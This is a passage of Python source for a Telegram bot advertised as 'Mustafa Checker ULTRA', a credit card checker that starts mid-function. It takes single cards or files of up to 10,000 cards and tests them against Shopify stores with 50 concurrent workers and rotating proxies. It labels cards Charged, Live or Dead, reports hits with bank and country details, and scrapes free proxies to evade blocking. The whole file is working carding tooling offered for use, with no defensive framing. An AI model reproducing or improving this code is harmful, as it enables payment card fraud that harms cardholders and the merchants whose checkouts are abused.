            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(source) as resp:
                    text = await resp.text()
                    for line in text.split('\n'):
                        proxy = line.strip()
                        if proxy and ':' in proxy and not proxy.startswith('#'):
                            new_proxies.append(proxy)
        except:
            pass
    
    # إزالة التكرار
    new_proxies = list(set(new_proxies))
    
    existing = []
    if os.path.exists(PROXY_FILE):
        async with aiofiles.open(PROXY_FILE, 'r') as f:
            existing = [p.strip() for p in await f.readlines() if p.strip()]
    
    added = 0
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for proxy in new_proxies[:100]:
            if proxy not in existing:
                await f.write(f"{proxy}\n")
                added += 1
    return added
# ==================== الأوامر ====================

# تحميل الكاش
load_cache()

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to Mustafa Checker ULTRA! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            "<b>✅ Bot uses DIRECT Shopify API</b>\n"
            "<b>⚡ Speed: 50x ULTRA Concurrent Workers</b>\n"
            "<b>🎯 Smart Product Detection (Cheapest Item)</b>\n"
            "<b>📡 Smart Proxy Manager with Auto-Fallback</b>\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC (3 sites at once)\n"
            "• /chk - Reply to .txt file to check cards (50x speed)</blockquote>\n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /site - Check sites & keep only working (with cart)\n"
            "• /sites - Show all working sites\n"
            "• /rm url - Remove a specific site</blockquote>\n"
            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /proxy - Check all proxies & remove dead\n"
            "• /addproxy - Add proxies (one per line)\n"
            "• /chkproxy proxy - Check single proxy\n"
            "• /rmproxy proxy - Remove single proxy\n"
            "• /clearproxy - Remove all proxies\n"
            "• /getproxy - Get all proxies\n"
            "• /proxy_status - Show current smart proxy status</blockquote>\n"
            "<b>⚡💠 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞</b>\n"
            "<blockquote>• /clean - Smart clean dead proxies & sites\n"
            "• /fetch_proxies - Fetch fresh proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            "<b>✅ ULTRA SHOPIFY CHECKER - 50x FASTER!</b>"
        ),
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern='/sites'))
async def show_sites(event):
    """عرض المواقع الشغالة"""
    sites = load_sites()
    if not sites:
        await event.reply("❌ No working sites found. Use /site to test sites.")
        return
    
    sites_list = "\n".join([f"✅ `{s}`" for s in sites[:30]])
    if len(sites) > 30:
        sites_list += f"\n...و {len(sites)-30} مواقع أخرى"
    
    await event.reply(
        f"<b>🌐 Working Sites ({len(sites)})</b>\n\n{sites_list}",
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    
    sites = load_sites()
    proxies = load_proxies()
    
    if not sites or not proxies:
        await event.reply("❌ No sites or proxies available. Use /site and /proxy first.")
        return
    
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply("❌ Invalid CC format. Use: /cc card|mm|yy|cvv")
        return
    
    card = cards[0]
    status_msg = await event.reply(f"🔄 **ULTRA CHECK - 3 sites at once**\n\n`{card}`")
    
    # اختيار 3 مواقع وبروكسيات
    test_sites = random.sample(sites, min(5, len(sites)))
    test_proxies = random.sample(proxies, min(5, len(proxies)))
    
    async def check_on_site(site, proxy):
        return await check_card_direct(card, site, proxy)
    
    tasks = []
    for i in range(min(5, len(test_sites), len(test_proxies))):
        tasks.append(check_on_site(test_sites[i], test_proxies[i]))
    
    results = await asyncio.gather(*tasks)
    
    # اختيار أفضل نتيجة
    best_result = None
    for result in results:
        if result['status'] == 'Charged':
            best_result = result
            break
        elif result['status'] == 'Approved' and not best_result:
            best_result = result
        elif not best_result:
            best_result = result
    
    if not best_result:
        best_result = results[0]
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
    
    if best_result['status'] == 'Charged':
        status_emoji, status_text = "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    elif best_result['status'] == 'Approved':
        status_emoji, status_text = "🔥", "𝐋𝐢𝐯𝐞"
    else:
        status_emoji, status_text = "❌", "𝐃𝐞𝐚𝐝"
    
    final_resp = f"""<b>⚡💳 ULTRA CC CHECKER</b>
━━━━━━━━━━━━━━━━━
{status_emoji} Status: {status_text}
💳 Card: <code>{best_result['card']}</code>
📝 Response: {best_result['message'][:150]}
🌐 Gateway: {best_result.get('gateway', 'Shopify')} | 💰 {best_result.get('price', '-')}
━━━━━━━━━━━━━━━━━
🎯 BIN Info:
{brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}
━━━━━━━━━━━━━━━━━
🤖 Bot By: Mustafa 🔥"""
    await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    if not event.reply_to_msg_id:
        await event.reply("Please reply to a .txt file")
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply("Please reply to a .txt file")
        return
    
    sites = load_sites()
    proxies = load_proxies()
    
    if not sites or not proxies:
        await event.reply("❌ No sites or proxies available. Use /site and /proxy first.")
        return
    
    status_msg = await event.reply("🔄 Processing your file...")
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    
    if not cards:
        await status_msg.edit("❌ No valid cards found in file.")
        os.remove(file_path)
        return
    
    if len(cards) > 10000:
        await status_msg.edit(f"⚠️ File contains {len(cards)} cards. Limiting to first 10000 cards.")
        cards = cards[:10000]
    
    os.remove(file_path)
    total_cards = len(cards)
    
    await status_msg.edit(f"🚀 **ULTRA MASS CHECK STARTED!**\n\n"
                         f"💳 Total Cards: {total_cards}\n"
                         f"🌐 Sites: {len(sites)}\n"
                         f"📡 Proxies: {len(proxies)}\n"
                         f"⚡ Concurrent: 50 cards at once\n"
                         f"📡 Smart Proxy: {smart_proxy_manager.get_current_type().upper()}\n\n"
                         f"📊 Progress: 0/{total_cards}")
    
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    
    try:
        card_queue = asyncio.Queue()
        for card in cards:
            await card_queue.put(card)
        
        async def worker(worker_id):
            while not card_queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                
                while session_state.get('paused', False):
                    await asyncio.sleep(0.3)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                
                try:
                    card = card_queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                current_sites = load_sites()
                current_proxies = load_proxies()
                
                if not current_sites or not current_proxies:
                    break
                
                site = random.choice(current_sites)
                proxy = random.choice(current_proxies)
                
                result = await check_card_direct(card, site, proxy)
                
                all_results['checked'] += 1
                
                if result['status'] == 'Charged':
                    all_results['charged'].append(result)
                    await send_realtime_hit(user_id, result, 'Charged', username)
                elif result['status'] == 'Approved':
                    all_results['approved'].append(result)
                    await send_realtime_hit(user_id, result, 'Approved', username)
                else:
                    all_results['dead'].append(result)
                
                if all_results['checked'] % 25 == 0 or all_results['checked'] == total_cards:
                    await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                
                card_queue.task_done()
        
        # 50 عامل متزامن - سرعة خارقة!
        workers = [asyncio.create_task(worker(i)) for i in range(50)]
        await asyncio.gather(*workers)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        await send_final_results(user_id, all_results)
        
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error: {e}")
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    """فحص المواقع المتطور"""
    user_id = event.sender_id
    status_msg = await event.reply("🌐 **ULTRA SITE SCANNER**\n\n🛒 Scanning sites for products & cart...")
    
    if not os.path.exists(SITES_FILE):
        await status_msg.edit("❌ sites.txt not found!")
        return
    
    async with aiofiles.open(SITES_FILE, 'r') as f:
        sites = [s.strip() for s in await f.readlines() if s.strip()]
    
    if not sites:
        await status_msg.edit("❌ No sites to scan!")
        return
    
    proxies = load_proxies()
    if not proxies:
        await status_msg.edit("⚠️ No proxies! Use /fetch_proxies first")
        return
    
    alive_sites = []
    dead_sites = []
    site_details = []
    
    for i, site in enumerate(sites):
        proxy = random.choice(proxies)
        is_alive, reason = await test_site_complete(site, proxy)
        
        if is_alive:
            alive_sites.append(site)
            site_details.append(f"✅ `{site}` - {reason}")
        else:
            dead_sites.append(site)
            site_details.append(f"❌ `{site}` - {reason}")
        
        if (i + 1) % 10 == 0 or i + 1 == len(sites):
            await status_msg.edit(
                f"🌐 **ULTRA SITE SCANNER**\n\n"
                f"📊 Progress: {i+1}/{len(sites)}\n"
                f"✅ Working: {len(alive_sites)}\n"
                f"❌ Dead: {len(dead_sites)}\n\n"
                f"{chr(10).join(site_details[-10:])}"
            )
    
    # حفظ المواقع الشغالة فقط
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in alive_sites:
            await f.write(f"{site}\n")
    
    # تحديث الكاش
    global site_cache
    site_cache['working_sites'] = alive_sites
    save_cache()
    
    result_text = f"✅ **ULTRA SCAN COMPLETE!**\n\n━━━━━━━━━━━━━━━━━\n"
    result_text += f"✅ **Working sites:** {len(alive_sites)}\n"
    result_text += f"❌ **Dead sites (removed):** {len(dead_sites)}\n━━━━━━━━━━━━━━━━━\n\n"
    
    if alive_sites:
        result_text += f"**Working sites:**\n" + "\n".join([f"✅ `{s}`" for s in alive_sites[:20]])
        if len(alive_sites) > 20:
            result_text += f"\n...and {len(alive_sites)-20} more"
    
    await status_msg.edit(result_text)

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    status_msg = await event.reply(f"🔥 **Checking proxies...**")
    
    proxies = load_proxies()
    if not proxies:
        await status_msg.edit("❌ proxy.txt is empty.")
        return
    
    alive = []
    dead = []
    
    for i, proxy in enumerate(proxies):
        if await test_proxy_direct(proxy):
            alive.append(proxy)
        else:
            dead.append(proxy)
        
        if (i + 1) % 20 == 0 or i + 1 == len(proxies):
            await status_msg.edit(f"📊 Progress: {i+1}/{len(proxies)}\n✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}")
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in alive:
            await f.write(f"{proxy}\n")
    
    await status_msg.edit(f"✅ **Proxy Check Complete!**\n\n✅ Alive: {len(alive)}\n❌ Removed: {len(dead)}")

@bot.on(events.NewMessage(pattern='/clean'))
async def clean_command(event):
    """تنظيف متطور"""
    user_id = event.sender_id
    status_msg = await event.reply("🧹 **ULTRA CLEANER**\n\n📡 Scanning proxies...")
    
    # تنظيف البروكسيات
    proxies = load_proxies()
    alive_proxies = []
    dead_proxies = []
    
    for i, proxy in enumerate(proxies):
        if await test_proxy_direct(proxy):
            alive_proxies.append(proxy)
        else:
            dead_proxies.append(proxy)
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in alive_proxies:
            await f.write(f"{proxy}\n")
    
    await status_msg.edit(f"🧹 **ULTRA CLEANER**\n\n✅ Proxies: {len(alive_proxies)} alive, {len(dead_proxies)} dead\n🌐 Scanning sites...")
    
    # تنظيف المواقع
    sites = load_sites()
    if sites and alive_proxies:
        alive_sites = []
        dead_sites = []
        
        for i, site in enumerate(sites):
            proxy = random.choice(alive_proxies)
            is_alive, _ = await test_site_complete(site, proxy)
            if is_alive:
                alive_sites.append(site)
            else:
                dead_sites.append(site)
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        await status_msg.edit(
            f"✅ **ULTRA CLEANER COMPLETE!**\n\n"
            f"📡 **Proxies:** {len(alive_proxies)} working, {len(dead_proxies)} removed\n"
            f"🌐 **Sites:** {len(alive_sites)} working, {len(dead_sites)} removed"
        )
    else:
        await status_msg.edit(
            f"✅ **Proxy Clean Complete!**\n\n"
            f"📡 **Proxies:** {len(alive_proxies)} working, {len(dead_proxies)} removed\n"
            f"🌐 **Sites:** No sites to scan"
        )

@bot.on(events.NewMessage(pattern='/fetch_proxies'))
async def fetch_proxies_command(event):
    user_id = event.sender_id
    status_msg = await event.reply("🔄 **Fetching fresh proxies...**")
    added = await add_free_proxies_direct()
    await status_msg.edit(f"✅ **Added {added} fresh proxies!**\n\nUse /proxy to test them.")

@bot.on(events.NewMessage(pattern='/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply("❌ Usage: /chkproxy ip:port:user:pass")
        return
    
    status_msg = await event.reply(f"🔄 **Testing proxy...**\n`{proxy}`")
    result = await test_proxy_direct(proxy)
    
    if result:
        await status_msg.edit(f"✅ **Proxy is WORKING!**\n\n`{proxy}`")
    else:
        await status_msg.edit(f"❌ **Proxy is DEAD!**\n\n`{proxy}`")

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply("❌ Usage: /addproxy followed by proxies, one per line.")
            return
        
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply("❌ No proxies provided.")
            return
        
        current_proxies = load_proxies()
        new_proxies = []
        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)
        
        if not new_proxies:
            await event.reply("⚠️ All proxies already exist.")
            return
        
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(f"✅ Added {len(new_proxies)} new proxies!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

@bot.on(events.NewMessage(pattern='/rm'))
async def remove_site_command(event):
    user_id = event.sender_id
    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply("❌ Usage: /rm https://site.com")
            return
        
        url_to_remove = args[1].strip()
        current_sites = load_sites()
        
        if url_to_remove not in current_sites:
            await event.reply(f"❌ Site not found: {url_to_remove}")
            return
        
        new_sites = [site for site in current_sites if site != url_to_remove]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")
        await event.reply(f"✅ Site Removed: {url_to_remove}")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

@bot.on(events.NewMessage(pattern='/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply("❌ Usage: /rmproxy ip:port:user:pass")
        return
    
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await event.reply(f"❌ Proxy not found: {proxy_to_remove}")
        return
    
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(f"✅ Proxy Removed!\n\n{proxy_to_remove}")

@bot.on(events.NewMessage(pattern='/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    current_proxies = load_proxies()
    count = len(current_proxies)
    if count == 0:
        await event.reply("❌ proxy.txt is already empty.")
        return
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await event.reply(f"✅ Cleared all {count} proxies!")

@bot.on(events.NewMessage(pattern='/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply("❌ No proxies in proxy.txt")
        return
    
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. {p}" for i, p in enumerate(current_proxies)])
        await event.reply(f"<b>All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}", parse_mode='html')
    else:
        filename = f"proxies_{user_id}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await bot.send_file(user_id, filename)
        os.remove(filename)

@bot.on(events.NewMessage(pattern='/proxy_status'))
async def proxy_status_command(event):
    """عرض حالة البروكسي الحالي من المدير الذكي"""
    status = smart_proxy_manager.get_status()
    
    proxy_display = status['current_proxy'][:60] + "..." if len(status['current_proxy']) > 60 else status['current_proxy']
    
    status_emoji = "🟢" if status['current_type'] == 'main' else "🟡"
    mode_text = "Main (Rotating IP)" if status['current_type'] == 'main' else "Backup (Stable)"
    
    message = f"""
<b>📡 Smart Proxy Manager Status</b>
━━━━━━━━━━━━━━━━━━━━
{status_emoji} <b>Current Proxy:</b> {status['current_type'].upper()}
<code>{proxy_display}</code>

<b>📊 Mode:</b> {mode_text}
<b>⚠️ Fallback Mode:</b> {'Enabled' if status['fallback_mode'] else 'Disabled'}
<b>📈 Error Count:</b> {status['error_count']}
━━━━━━━━━━━━━━━━━━━━
✅ <b>Auto-rotation:</b> Main proxy rotates IP automatically
🔄 <b>Auto-fallback:</b> Switches to backup on 3 errors
"""
    await event.reply(premium_emoji(message), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    """إحصائيات البوت"""
    sites = load_sites()
    proxies = load_proxies()
    proxy_status = smart_proxy_manager.get_status()
    
    await event.reply(
        f"<b>📊 BOT STATISTICS</b>\n\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Working Sites:</b> {len(sites)}\n"
        f"📡 <b>Proxies:</b> {len(proxies)}\n"
        f"📡 <b>Smart Proxy:</b> {proxy_status['current_type'].upper()}\n"
        f"⚡ <b>Concurrent Workers:</b> 50\n"
        f"🚀 <b>Speed:</b> Ultra\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Status:</b> ONLINE - ULTRA MODE\n"
        f"🤖 <b>Bot By:</b> Mustafa 🔥",
        parse_mode='html'
    )

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit("⛔ Checking stopped by user.")

# ==================== تهيئة المدير الذكي ====================
print("=" * 60)
print("🚀 ULTRA SHOPIFY CHECKER BOT - STARTED!")
print("=" * 60)
print("👤 Owner: Mustafa")
print("⚡ Workers: 50 Concurrent")
print("🛒 Smart Site Filter: Products + Cart (Cheapest Item)")
print("💰 Smart Product Selection: Cheapest Available Product")
print("📡 Smart Proxy Manager: Main (Rotating) + Backup (Stable)")
print("📊 Real-time ETA & Speed Stats")
print("=" * 60)
print("📡 SMART PROXY MANAGER INITIALIZED")
status = smart_proxy_manager.get_status()
print(f"   Main Proxy: {smart_proxy_manager.main_proxy[:60]}...")
print(f"   Backup Proxy: {smart_proxy_manager.backup_proxy[:60]}...")
print(f"   Current: {status['current_type'].upper()}")
print("=" * 60)

bot.run_until_disconnected()